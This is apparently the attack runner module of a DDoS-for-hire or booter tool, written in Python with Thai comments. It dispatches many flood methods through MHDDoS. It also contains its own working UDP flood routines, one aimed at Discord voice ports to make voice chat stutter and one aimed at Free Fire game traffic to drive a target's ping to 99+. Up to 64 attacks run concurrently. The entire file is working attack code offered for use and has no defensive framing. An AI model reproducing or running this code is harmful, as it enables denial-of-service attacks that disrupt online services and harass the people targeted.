# attacker/__init__.py — attack runner
# FREEFIRE อยู่รวมใน L4_METHODS · VC_DISCORD อยู่ใน ALL_METHODS
import asyncio, os, sys, time, random, socket, subprocess
from config import (
    MHDDOS_DIR, FF_ENDPOINTS,
    DISCORD_VOICE_PORT_MIN, DISCORD_VOICE_PORT_MAX,
)
from db import finish_attack

# ---- Layer 7 ----
L7_METHODS = [
    "GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW",
    "HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE",
    "XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR",
]

# ---- Layer 4 / Layer 3 — รวม FREEFIRE เข้ามาแล้ว ----
L4_METHODS = [
    "TCP","UDP","SYN","OVH-UDP","CPS","ICMP","CONNECTION",
    "VSE","TS3","FIVEM","FIVEM-TOKEN","MEM","NTP","MCBOT","MINECRAFT",
    "MCPE","DNS","CHAR","CLDAP","ARD","RDP",
    "FREEFIRE",   # ← ย้ายมาจาก EXTRA
]

# ---- extras — VC_DISCORD และ http-family ----
EXTRA_METHODS = [
    "VC_DISCORD",
    "HTTPS", "HTTPSLOAD", "BYBROWSER", "HTTPSBYPASS", "CDNBYPASS",
]

# ---- ALL_METHODS รวม VC_DISCORD + FREEFIRE ครบ ----
ALL_METHODS = L7_METHODS + L4_METHODS + EXTRA_METHODS

_sem = None
_procs: dict[str, asyncio.subprocess.Process] = {}

def _get_sem():
    global _sem
    if _sem is None:
        _sem = asyncio.Semaphore(64)
    return _sem

async def _run_mhddos(method: str, target: str, port: int, dur: int):
    start = os.path.join(MHDDOS_DIR, "start.py")
    if not os.path.isfile(start):
        raise FileNotFoundError(f"MHDDoS start.py not found at {start}")
    cmd = [sys.executable, start, method, target, str(port), "256", str(dur)]
    proc = await asyncio.create_subprocess_exec(
        *cmd, cwd=MHDDOS_DIR,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    try:
        await asyncio.wait_for(proc.wait(), timeout=dur + 30)
    except asyncio.TimeoutError:
        proc.kill(); await proc.wait()

async def _run_vc_discord(target: str, dur: int):
    """VC Discord — UDP flood เข้า voice port range ให้เสียงกระตุก"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    payload = os.urandom(1024)
    end = time.time() + dur
    while time.time() < end:
        port = random.randint(DISCORD_VOICE_PORT_MIN, DISCORD_VOICE_PORT_MAX)
        try: sock.sendto(payload, (target, port))
        except Exception: pass
        await asyncio.sleep(0)
    sock.close()

async def _run_freefire(target: str, port: int, dur: int):
    """Free Fire — UDP flood รุนแรง ให้ ping 99+"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    payload = os.urandom(1400)
    end = time.time() + dur
    while time.time() < end:
        for _ in range(64):
            try: sock.sendto(payload, (target, port))
            except Exception: break
        await asyncio.sleep(0)
    sock.close()

async def run(aid: str, target: str, port: int, dur: int, method: str):
    async with _get_sem():
        try:
            # handler เฉพาะก่อน — FREEFIRE อยู่ใน L4 แต่มี runner ของตัวเอง
            if method == "VC_DISCORD":
                await _run_vc_discord(target, dur)
            elif method == "FREEFIRE":
                await _run_freefire(target, port, dur)
            elif method in L7_METHODS or method in L4_METHODS:
                await _run_mhddos(method, target, port, dur)
            else:
                # HTTPS / HTTPSLOAD / BYBROWSER / HTTPSBYPASS / CDNBYPASS
                try:
                    await _run_mhddos(method, target, port, dur)
                except Exception:
                    await _run_mhddos("GET", target, port, dur)
        except Exception as e:
            print(f"[attacker] error aid={aid} method={method} err={e}")
        finally:
            finish_attack(aid)